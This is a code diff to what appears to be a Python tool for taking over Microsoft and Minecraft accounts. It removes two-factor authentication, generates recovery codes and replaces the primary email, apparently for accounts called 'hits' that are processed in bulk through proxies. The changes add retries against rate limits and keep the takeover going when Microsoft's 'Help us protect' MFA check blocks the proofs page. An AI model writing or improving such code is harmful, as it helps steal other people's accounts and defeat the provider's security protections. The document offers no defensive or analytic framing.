@@ -231,14 +231,14 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     # Minecraft checking — retry when XBL/SSID fail (rate limit / parse race).
     # Never label transient failures as "No Minecraft" — that was a false negative
     # when VaultProxies killed sisu.xboxlive.com connections.
-    mc_attempts = 3
+    mc_attempts = 6
     for attempt in range(1, mc_attempts + 1):
         outcome = await _check_minecraft(session, account_info)
         if outcome != "transient":
             break
         if attempt < mc_attempts:
             # 429 from login_with_xbox needs longer gaps under bulk parallel load
-            delay = 8.0 * attempt
+            delay = min(10.0 * attempt, 45.0)
             print(f"[~] - MC check inconclusive (attempt {attempt}/{mc_attempts}), retrying in {delay:.0f}s...")
             log.warning("MC check transient failure attempt %s/%s — sleeping %.1fs", attempt, mc_attempts, delay)
             await asyncio.sleep(delay)
@@ -303,31 +303,70 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
     await remove_2fa(session, apicanary)
 
     ms = account_info.get("microsoft") or {}
-    security_parameters = json.loads(
-        await security_information(
-            session,
-            security_email=ms.get("security_email"),
-            account_email=ms.get("email"),
-            password=ms.get("password"),
-        )
+    existing_recovery = ms.get("recovery_code")
+    has_recovery = bool(
+        existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")
     )
-    main_email = security_parameters.get("email") or account_info["microsoft"].get("email")
+
+    security_parameters = None
+    try:
+        security_parameters = json.loads(
+            await security_information(
+                session,
+                security_email=ms.get("security_email"),
+                account_email=ms.get("email"),
+                password=ms.get("password"),
+            )
+        )
+    except RuntimeError as exc:
+        # i5600 "Help us protect" often blocks proofs/Manage after recover already
+        # succeeded. Soft-continue so the hit is not lost — keep recovery code,
+        # still run MC / API cleanup that does not need t0.
+        msg = str(exc)
+        if has_recovery and (
+            "could not find var t0" in msg
+            or "i5600" in msg
+            or "proofs page" in msg
+        ):
+            log.warning(
+                "security_information soft-skip after recover for %s: %s",
+                ms.get("email"),
+                msg[:300],
+            )
+            print(
+                "[!] - Proofs MFA blocked (i5600) — continuing with existing recovery "
+                "(skipping proofs/Manage t0)"
+            )
+            security_parameters = None
+        else:
+            raise
+
+    main_email = None
+    if security_parameters:
+        main_email = security_parameters.get("email") or account_info["microsoft"].get("email")
+    else:
+        main_email = account_info["microsoft"].get("email")
     # Seed primary immediately so partial failures still show the real address
     if main_email and main_email != "Couldn't Change!":
         account_info["microsoft"]["email"] = main_email
     print(f"[+] - Got Security Parameters (primary={account_info['microsoft']['email']})")
-    
-    encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
 
-    existing_recovery = account_info["microsoft"].get("recovery_code")
-    has_recovery = existing_recovery and existing_recovery not in ("Couldn't Change!", "Failed to generate")
+    encryptedNetID = None
+    if security_parameters:
+        try:
+            encryptedNetID = security_parameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
+        except (KeyError, TypeError):
+            encryptedNetID = None
+            log.warning("security_parameters missing manageProofs.encryptedNetId")
 
     if recovery or not has_recovery:
-        generated_code = await get_recovery_code(
-            session,
-            apicanary,
-            encryptedNetID
-        )
+        generated_code = None
+        if encryptedNetID:
+            generated_code = await get_recovery_code(
+                session,
+                apicanary,
+                encryptedNetID
+            )
         if generated_code:
             recovery_code = generated_code
         elif has_recovery:
